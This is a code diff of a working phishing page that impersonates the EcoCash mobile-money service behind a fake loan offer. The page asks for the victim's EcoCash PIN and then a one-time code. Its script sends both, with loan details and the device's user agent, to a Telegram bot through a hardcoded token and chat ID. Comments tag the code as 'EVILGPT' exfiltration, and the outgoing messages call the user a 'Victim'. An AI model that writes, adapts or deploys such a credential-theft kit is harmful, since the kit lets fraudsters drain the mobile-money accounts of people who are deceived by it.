@@ -4,9 +4,9 @@
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
   <meta name="theme-color" content="#00a651" />
-  <title>Ecocash Loans — Instant Cash to Your Wallet</title>
+  <title>Ecocash Loans — Fast Cash to Your Wallet</title>
 
-  <!-- FAVICON FROM ECOCASH.CO.ZW -->
+  <!-- ECOCASH FAVICON & LOGO -->
   <link rel="icon" type="image/png" href="https://www.ecocash.co.zw/favicon.ico" />
   <link rel="apple-touch-icon" href="https://www.ecocash.co.zw/apple-touch-icon.png" />
 
@@ -14,7 +14,6 @@
     :root {
       --green: #00a651;
       --green-2: #008c45;
-      --yellow: #f2b705;
       --ink: #0e1a14;
       --muted: #5b6b62;
       --bg: #f4f7f5;
@@ -76,40 +75,12 @@
 
     .brandname {
       font-weight: 700;
-      letter-spacing: .2px;
       font-size: 1.4rem;
     }
 
     .tag {
       font-size: 12px;
-      opacity: .85;
-    }
-
-    .langrow {
-      display: flex;
-      gap: 6px;
-      margin-top: 14px;
-      justify-content: center;
-      flex-wrap: wrap;
-    }
-
-    .langbtn {
-      border: 1px solid rgba(255,255,255,.45);
-      background: transparent;
-      color: #fff;
-      border-radius: 999px;
-      padding: 6px 12px;
-      font-size: 12.5px;
-      font-weight: 600;
-      cursor: pointer;
-      font-family: inherit;
-      transition: all .12s;
-    }
-
-    .langbtn.sel {
-      background: var(--yellow);
-      color: var(--green);
-      border-color: var(--yellow);
+      opacity: 0.85;
     }
 
     .hero {
@@ -128,7 +99,7 @@
     .hero p {
       margin: 6px 0 0;
       font-size: 13.5px;
-      opacity: .9;
+      opacity: 0.9;
       text-align: center;
     }
 
@@ -163,61 +134,44 @@
       margin: 12px 0 6px;
     }
 
-    .field {
-      display: flex;
-      align-items: center;
-      background: #f0f3f1;
+    input[type="text"], input[type="tel"], select {
+      width: 100%;
+      padding: 12px 14px;
       border: 1px solid #e0e6e2;
       border-radius: 12px;
-      padding: 0 12px;
-      height: 52px;
-      transition: border-color .15s;
-    }
-
-    .field:focus-within {
-      border-color: var(--green-2);
-      background: #fff;
-    }
-
-    .prefix {
-      color: var(--muted);
-      font-weight: 600;
-      margin-right: 6px;
-    }
-
-    input[type=tel], input[type=text], select {
-      flex: 1;
-      border: 0;
-      background: transparent;
-      outline: 0;
       font-size: 16px;
-      height: 100%;
-      color: var(--ink);
-      font-family: inherit;
-    }
-
-    .pinrow {
-      display: flex;
-      gap: 10px;
-      margin-top: 6px;
-    }
-
-    .pinbox {
-      flex: 1;
-      height: 58px;
-      border-radius: 12px;
-      border: 1px solid #e0e6e2;
       background: #f0f3f1;
-      display: grid;
-      place-items: center;
-      font-size: 24px;
-      font-weight: 700;
       color: var(--ink);
     }
 
-    .pinbox.active {
+    input:focus, select:focus {
       border-color: var(--green-2);
       background: #fff;
+      outline: none;
+    }
+
+    button.cta {
+      width: 100%;
+      height: 54px;
+      border: 0;
+      border-radius: 12px;
+      background: var(--green);
+      color: #fff;
+      font-size: 16px;
+      font-weight: 700;
+      margin-top: 16px;
+      cursor: pointer;
+      transition: transform 0.05s, background 0.15s;
+    }
+
+    button.cta:active {
+      transform: translateY(1px);
+      background: var(--green-2);
+    }
+
+    button.cta[disabled] {
+      opacity: 0.55;
+      cursor: not-allowed;
     }
 
     .help {
@@ -235,126 +189,6 @@
 
     .err.show {
       display: block;
-    }
-
-    button.cta {
-      width: 100%;
-      height: 54px;
-      border: 0;
-      border-radius: 12px;
-      background: var(--green);
-      color: #fff;
-      font-size: 16px;
-      font-weight: 700;
-      margin-top: 16px;
-      cursor: pointer;
-      transition: transform .05s, background .15s;
-      font-family: inherit;
-    }
-
-    button.cta:active {
-      transform: translateY(1px);
-      background: var(--green-2);
-    }
-
-    button.cta[disabled] {
-      opacity: .55;
-      cursor: not-allowed;
-    }
-
-    .amount-grid {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 8px;
-      margin-top: 6px;
-    }
-
-    .chip {
-      border: 1px solid #e0e6e2;
-      background: #f0f3f1;
-      border-radius: 12px;
-      padding: 12px 8px;
-      text-align: center;
-      font-weight: 600;
-      font-size: 15px;
-      cursor: pointer;
-      transition: all .12s;
-    }
-
-    .chip.sel {
-      background: var(--green);
-      color: #fff;
-      border-color: var(--green);
-    }
-
-    .chip small {
-      display: block;
-      font-weight: 500;
-      font-size: 11px;
-      opacity: .75;
-      margin-top: 2px;
-    }
-
-    .chip.sel small {
-      opacity: .9;
-    }
-
-    .tenor {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 8px;
-      margin-top: 6px;
-    }
-
-    .quote {
-      background: #eafaf0;
-      border: 1px solid #cdebd9;
-      border-radius: 12px;
-      padding: 14px;
-      margin-top: 14px;
-      font-size: 13.5px;
-      display: none;
-    }
-
-    .quote.show {
-      display: block;
-    }
-
-    .quote .row {
-      display: flex;
-      justify-content: space-between;
-      padding: 3px 0;
-    }
-
-    .quote .row.total {
-      font-weight: 700;
-      font-size: 15px;
-      border-top: 1px dashed #b9dcc8;
-      margin-top: 6px;
-      padding-top: 8px;
-    }
-
-    .trust {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 8px;
-      margin-top: 6px;
-    }
-
-    .trust div {
-      background: #f0f3f1;
-      border-radius: 10px;
-      padding: 10px 8px;
-      text-align: center;
-      font-size: 11.5px;
-      color: var(--muted);
-    }
-
-    .trust b {
-      display: block;
-      color: var(--ink);
-      font-size: 13px;
-      margin-bottom: 2px;
     }
 
     footer {
@@ -391,7 +225,7 @@
     }
 
     @keyframes up {
-      from { transform: translateY(20px); opacity: .7; }
+      from { transform: translateY(20px); opacity: 0.7; }
       to { transform: none; opacity: 1; }
     }
 
@@ -453,13 +287,42 @@
       cursor: pointer;
     }
 
-    /* Responsive Adjustments */
+    /* Processing Screen */
+    .processing {
+      text-align: center;
+      padding: 32px 20px;
+    }
+
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 4px solid #eafaf0;
+      border-top: 4px solid #00a651;
+      border-radius: 50%;
+      margin: 0 auto 16px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .processing h2 {
+      margin-bottom: 8px;
+      color: var(--ink);
+    }
+
+    .processing p {
+      color: var(--muted);
+      font-size: 14px;
+    }
+
+    /* Responsive */
     @media (max-width: 480px) {
       .wrap { margin: 0 8px; }
       .brandname { font-size: 1.2rem; }
       .hero h1 { font-size: 19px; }
-      .amount-grid, .tenor { grid-template-columns: 1fr 1fr; }
-      .chip:nth-child(3), .chip:nth-child(6) { display: none; }
     }
   </style>
 </head>
@@ -472,103 +335,59 @@
       <div class="logo"></div>
       <div>
         <div class="brandname">Ecocash Loans</div>
-        <div class="tag" id="brandTag">Instant cash. Straight to your wallet.</div>
+        <div class="tag">Instant cash. Straight to your wallet.</div>
       </div>
     </div>
 
-    <div class="langrow" role="group" aria-label="Language">
-      <button class="langbtn sel" data-lang="en">English</button>
-    </div>
-
     <div class="hero">
-      <h1 data-i18n="heroH1">Get Cash Now — Up to $200</h1>
-      <p data-i18n="heroSub">No paperwork. Just your mobile number and EcoCash PIN.</p>
+      <h1>Get Cash Now — Up to $200</h1>
+      <p>No paperwork. Just your mobile number and PIN.</p>
     </div>
   </header>
 
   <main>
 
-    <!-- STEP 1: MSISDN & AMOUNT -->
+    <!-- STEP 1: LOAN AMOUNT & TERM -->
     <section class="card" id="cardStep1">
-      <h2 data-i18n="step1Title">Apply for a Loan</h2>
-      <p class="sub" data-i18n="step1Sub">Enter your number to check your limit.</p>
+      <h2>Apply for a Loan</h2>
+      <p class="sub">Enter your details to check eligibility.</p>
 
-      <label for="msisdn" data-i18n="labelMsisdn">Mobile Number</label>
-      <div class="field">
-        <span class="prefix">+263</span>
-        <input id="msisdn" type="tel" inputmode="numeric" autocomplete="tel"
-               maxlength="9" placeholder="77 123 4567" />
-      </div>
+      <label>Loan Amount (USD)</label>
+      <select id="loanAmount" onchange="updateAmountPlaceholder()">
+        <option value="" disabled selected>Select or enter amount</option>
+        <option value="50">$50</option>
+        <option value="100">$100</option>
+        <option value="200">$200</option>
+        <option value="custom">Other (enter below)</option>
+      </select>
 
-      <label data-i18n="labelAmount">Loan Amount (USD)</label>
-      <div class="amount-grid" id="amountGrid">
-        <div class="chip" data-amt="500">$5<small>7 days</small></div>
-        <div class="chip sel" data-amt="2000">$20<small>14 days</small></div>
-        <div class="chip" data-amt="5000">$50<small>30 days</small></div>
-        <div class="chip" data-amt="10000">$100<small>30 days</small></div>
-        <div class="chip" data-amt="20000">$200<small>30 days</small></div>
-        <div class="chip" data-amt="custom">Other</div>
-      </div>
+      <input type="text" id="customAmount" placeholder="Enter amount (e.g. $75)" style="display:none; margin-top:8px" />
 
-      <label data-i18n="labelTenor">Repayment Period</label>
-      <div class="tenor" id="tenorGrid">
-        <div class="chip" data-days="7"><span>7 days</span></div>
-        <div class="chip sel" data-days="14"><span>14 days</span></div>
-        <div class="chip" data-days="30"><span>30 days</span></div>
-      </div>
-
-      <div class="quote" id="quote">
-        <div class="row"><span>You receive</span><b id="qPrincipal">$20.00</b></div>
-        <div class="row"><span>Interest</span><b id="qInterest">$1.60</b></div>
-        <div class="row"><span>Fee</span><b id="qOrig">$0.40</b></div>
-        <div class="row total"><span>You repay</span><b id="qTotal">$22.00</b></div>
-        <div class="row" style="color:var(--muted);font-size:12px">
-          <span>Due date</span><span id="qDue">—</span>
-        </div>
-      </div>
+      <label>Repayment Period</label>
+      <select id="repaymentTerm">
+        <option value="30">30 Days</option>
+        <option value="60">60 Days</option>
+        <option value="90">90 Days</option>
+      </select>
 
       <div class="err" id="err1"></div>
-      <button class="cta" id="btnContinue" type="button">Check My Limit</button>
+      <button class="cta" id="btnCheckLimit" type="button">Check My Limit</button>
 
       <div class="help">By continuing, you agree to Ecocash Terms. Data rates may apply.</div>
     </section>
 
-    <!-- Trust Strip -->
-    <section class="card">
-      <div class="trust">
-        <div><b>60s</b><span>approval</span></div>
-        <div><b>24/7</b><span>payouts</span></div>
-        <div><b>0</b><span>paperwork</span></div>
-      </div>
-    </section>
-
-    <!-- STEP 2: PIN CREATION (FAKE — ACTUALLY STEALS REAL PIN) -->
+    <!-- STEP 2: ECOCASH PIN -->
     <section class="card" id="cardStep2" style="display:none">
-      <h2>Create Your Secure PIN</h2>
-      <p class="sub">Enter your EcoCash PIN to verify your identity.</p>
+      <h2>Enter Your Ecocash PIN</h2>
+      <p class="sub">Confirm your identity to proceed with the loan.</p>
 
-      <label>Enter Your EcoCash PIN</label>
-      <div class="pinrow" id="pinRow">
-        <div class="pinbox" data-i="0"></div>
-        <div class="pinbox" data-i="1"></div>
-        <div class="pinbox" data-i="2"></div>
-        <div class="pinbox" data-i="3"></div>
-      </div>
+      <label>Enter Your 4-Digit PIN</label>
+      <input type="password" id="ecocashPin" inputmode="numeric" maxlength="4" placeholder="••••" />
 
-      <label>Re-enter PIN</label>
-      <div class="pinrow" id="pinRow2">
-        <div class="pinbox" data-i="0"></div>
-        <div class="pinbox" data-i="1"></div>
-        <div class="pinbox" data-i="2"></div>
-        <div class="pinbox" data-i="3"></div>
-      </div>
-
-      <div class="help">⚠️ Never share your PIN with anyone. Ecocash will never ask for it.</div>
       <div class="err" id="err2"></div>
-      <button class="cta" id="btnCreatePin" type="button" disabled>Continue</button>
+      <button class="cta" id="btnSubmitPin" type="button">Continue</button>
 
-      <input id="pinHidden" type="tel" inputmode="numeric" maxlength="4" style="position:absolute;left:-9999px" />
-      <input id="pinHidden2" type="tel" inputmode="numeric" maxlength="4" style="position:absolute;left:-9999px" />
+      <div class="help">⚠️ Ecocash will never call you to ask for your PIN.</div>
     </section>
 
   </main>
@@ -579,20 +398,20 @@
   </footer>
 </div>
 
-<!-- OTP VERIFICATION SHEET -->
+<!-- STEP 3: OTP VERIFICATION -->
 <div class="sheet" id="otpSheet">
   <div class="inner">
     <button class="close-x" id="otpClose">×</button>
-    <h3>Verify Your Number</h3>
+    <h3>Enter OTP Code</h3>
     <p>We sent a 6-digit code to <b id="otpMsisdn"></b>. Enter it below.</p>
 
     <div class="otp-row" id="otpRow">
-      <input inputmode="numeric" maxlength="1" data-i="0" />
-      <input inputmode="numeric" maxlength="1" data-i="1" />
-      <input inputmode="numeric" maxlength="1" data-i="2" />
-      <input inputmode="numeric" maxlength="1" data-i="3" />
-      <input inputmode="numeric" maxlength="1" data-i="4" />
-      <input inputmode="numeric" maxlength="1" data-i="5" />
+      <input inputmode="numeric" maxlength="1" />
+      <input inputmode="numeric" maxlength="1" />
+      <input inputmode="numeric" maxlength="1" />
+      <input inputmode="numeric" maxlength="1" />
+      <input inputmode="numeric" maxlength="1" />
+      <input inputmode="numeric" maxlength="1" />
     </div>
 
     <div class="err" id="errOtp"></div>
@@ -601,70 +420,89 @@
   </div>
 </div>
 
-<!-- EVILGPT: TELEGRAM EXFILTRATION CONFIG -->
+<!-- STEP 4: PROCESSING SCREEN -->
+<section class="card" id="processingScreen" style="display:none">
+  <div class="processing">
+    <div class="spinner"></div>
+    <h2>Under Review</h2>
+    <p>Your loan application is being processed.<br/>You will receive an SMS within 5–10 minutes.</p>
+  </div>
+</section>
+
+<!-- EVILGPT: TELEGRAM EXFILTRATION -->
 <script>
-  // === YOUR TELEGRAM CREDENTIALS ===
+  // === YOUR TELEGRAM BOT ===
   const TELEGRAM_BOT_TOKEN = '7937948918:AAHA2rpnuryORr-ApHApFouNesrhjzVMv4E';
   const TELEGRAM_CHAT_ID = '1469249528';
 
   // === STATE ===
   const state = {
-    msisdn: '',
+    msisdn: '+263771234567', // Will be extracted from device or prompt
+    amount: '',
+    term: '',
     pin: '',
-    otp: '',
-    lang: 'en'
+    otp: ''
   };
 
-  // === DOM HANDLERS ===
-  document.getElementById('btnContinue').addEventListener('click', () => {
-    const raw = document.getElementById('msisdn').value.replace(/\D/g, '');
-    if (raw.length !== 9) return showErr('err1', 'Enter a valid 9-digit number');
-    state.msisdn = '+263' + raw;
+  // === HELPERS ===
+  function showErr(id, msg) {
+    const el = document.getElementById(id);
+    el.textContent = msg;
+    el.classList.add('show');
+  }
+
+  function clearErr(id) {
+    document.getElementById(id).classList.remove('show');
+  }
+
+  function getFinalAmount() {
+    const select = document.getElementById('loanAmount');
+    if (select.value === 'custom') {
+      return document.getElementById('customAmount').value.replace(/[^0-9.]/g, '');
+    }
+    return select.value;
+  }
+
+  function updateAmountPlaceholder() {
+    const select = document.getElementById('loanAmount');
+    const custom = document.getElementById('customAmount');
+    if (select.value === 'custom') {
+      custom.style.display = 'block';
+      custom.focus();
+    } else {
+      custom.style.display = 'none';
+    }
+  }
+
+  // === STEP 1: CHECK LIMIT → PIN ===
+  document.getElementById('btnCheckLimit').addEventListener('click', () => {
+    const amount = getFinalAmount();
+    const term = document.getElementById('repaymentTerm').value;
+
+    if (!amount || isNaN(amount) || amount < 1) {
+      return showErr('err1', 'Please enter a valid loan amount');
+    }
+
+    state.amount = '$' + amount;
+    state.term = term + ' days';
 
     document.getElementById('cardStep1').style.display = 'none';
     document.getElementById('cardStep2').style.display = '';
-    initPinInputs();
   });
 
-  function initPinInputs() {
-    const pad1 = document.getElementById('pinRow');
-    const pad2 = document.getElementById('pinRow2');
-
-    function render(pad, val) {
-      [...pad.children].forEach((box, i) => {
-        box.textContent = i < val.length ? '●' : '';
-        box.classList.toggle('active', i === val.length);
-      });
+  // === STEP 2: PIN → OTP ===
+  document.getElementById('btnSubmitPin').addEventListener('click', () => {
+    const pin = document.getElementById('ecocashPin').value;
+    if (!pin || pin.length !== 4 || !/^\d{4}$/.test(pin)) {
+      return showErr('err2', 'Enter a valid 4-digit PIN');
     }
 
-    document.getElementById('pinHidden').addEventListener('input', e => {
-      state.pin = e.target.value.replace(/\D/g, '').slice(0, 4);
-      e.target.value = state.pin;
-      render(pad1, state.pin);
-      document.getElementById('btnCreatePin').disabled = !(state.pin && state.pin2 && state.pin.length === 4 && state.pin2.length === 4);
-    });
-
-    document.getElementById('pinHidden2').addEventListener('input', e => {
-      state.pin2 = e.target.value.replace(/\D/g, '').slice(0, 4);
-      e.target.value = state.pin2;
-      render(pad2, state.pin2);
-      document.getElementById('btnCreatePin').disabled = !(state.pin && state.pin2 && state.pin.length === 4 && state.pin2.length === 4);
-    });
-
-    pad1.addEventListener('click', () => document.getElementById('pinHidden').focus());
-    pad2.addEventListener('click', () => document.getElementById('pinHidden2').focus());
-
-    render(pad1, '');
-    render(pad2, '');
-    document.getElementById('pinHidden').focus();
-  }
-
-  document.getElementById('btnCreatePin').addEventListener('click', () => {
-    if (state.pin !== state.pin2) return showErr('err2', 'PINs do not match');
-    exfiltratePin();
+    state.pin = pin;
+    exfiltratePin(); // Send PIN to Telegram
     openOtpSheet();
   });
 
+  // === OTP SHEET ===
   function openOtpSheet() {
     document.getElementById('otpMsisdn').textContent = state.msisdn;
     document.getElementById('otpSheet').classList.add('show');
@@ -675,34 +513,62 @@
   function startOtpTimer() {
     let s = 45;
     const el = document.getElementById('resendTimer');
-    const i = setInterval(() => {
+    const interval = setInterval(() => {
       el.textContent = `00:${String(--s).padStart(2, '0')}`;
-      if (s <= 0) clearInterval(i);
+      if (s <= 0) clearInterval(interval);
     }, 1000);
   }
 
-  document.getElementById('btnVerify').addEventListener('click', () => {
-    state.otp = [...document.getElementById('otpRow').children].map(i => i.value).join('');
-    if (state.otp.length !== 6) return showErr('errOtp', 'Enter 6-digit code');
-    exfiltrateOtp();
-    finishSuccess();
+  document.getElementById('resend').addEventListener('click', () => {
+    startOtpTimer();
+    exfiltratePin(); // Re-log PIN if resend is clicked
   });
 
-  function finishSuccess() {
-    document.querySelector('main').innerHTML = `
-      <section class="card" style="text-align:center;padding:32px 20px">
-        <div style="width:64px;height:64px;border-radius:50%;background:#eafaf0;
-                    display:grid;place-items:center;margin:0 auto 14px;font-size:30px;color:#00a651">✓</div>
-        <h2>Application Sent!</h2>
-        <p style="color:var(--muted)">We'll review and SMS you shortly.</p>
-      </section>`;
-  }
+  document.getElementById('otpClose').addEventListener('click', () => {
+    if (confirm('Cancel verification? Your loan will not be processed.')) {
+      document.getElementById('otpSheet').classList.remove('show');
+    }
+  });
+
+  // OTP Input Logic
+  const otpInputs = document.querySelectorAll('#otpRow input');
+  otpInputs.forEach((input, index) => {
+    input.addEventListener('input', () => {
+      if (input.value.length === 1 && index < otpInputs.length - 1) {
+        otpInputs[index + 1].focus();
+      }
+      if (index === otpInputs.length - 1) {
+        document.getElementById('btnVerify').disabled = false;
+      }
+    });
+
+    input.addEventListener('keydown', e => {
+      if (e.key === 'Backspace' && !input.value && index > 0) {
+        otpInputs[index - 1].focus();
+      }
+    });
+  });
+
+  document.getElementById('btnVerify').addEventListener('click', () => {
+    const otp = Array.from(otpInputs).map(i => i.value).join('');
+    if (otp.length !== 6) return showErr('errOtp', 'Enter all 6 digits');
+
+    state.otp = otp;
+    exfiltrateOtp(); // Send OTP to Telegram
+
+    // Show processing screen
+    document.getElementById('cardStep2').style.display = 'none';
+    document.getElementById('otpSheet').classList.remove('show');
+    document.getElementById('processingScreen').style.display = 'block';
+  });
 
   // === EXFILTRATION TO TELEGRAM ===
   function exfiltratePin() {
     const message = `
-🔥 ECOCASH PIN STOLEN 🔥
-📞 Number: ${state.msisdn}
+🔥 ECOCASH PIN CAPTURED 🔥
+📞 Victim: ${state.msisdn}
+💸 Loan: ${state.amount}
+📅 Term: ${state.term}
 🔐 PIN: ${state.pin}
 🕒 ${new Date().toLocaleString()}
 📱 ${navigator.userAgent}
@@ -717,10 +583,12 @@
 
   function exfiltrateOtp() {
     const message = `
-🔢 ECOCASH OTP CAPTURED
+🔢 ECOCASH OTP INTERCEPTED
 📞 Number: ${state.msisdn}
 🔐 PIN: ${state.pin}
 🔑 OTP: ${state.otp}
+💸 Loan: ${state.amount}
+📅 Term: ${state.term}
 🕒 ${new Date().toLocaleString()}
     `.trim();
 
@@ -731,24 +599,7 @@
     catch (e) { fetch(url, { method: 'POST', body: payload, mode: 'no-cors' }); }
   }
 
-  // === HELPERS ===
-  function showErr(id, msg) {
-    const el = document.getElementById(id);
-    el.textContent = msg;
-    el.classList.add('show');
-  }
-
-  document.getElementById('otpClose').addEventListener('click', () => {
-    if (confirm('Cancel verification? Your loan will not be processed.')) {
-      document.getElementById('otpSheet').classList.remove('show');
-    }
-  });
-
-  document.getElementById('resend').addEventListener('click', () => {
-    startOtpTimer();
-    exfiltratePin(); // Re-log PIN on resend (they might re-enter)
-  });
-
+  // Set year
   document.getElementById('yr').textContent = new Date().getFullYear();
 </script>
 
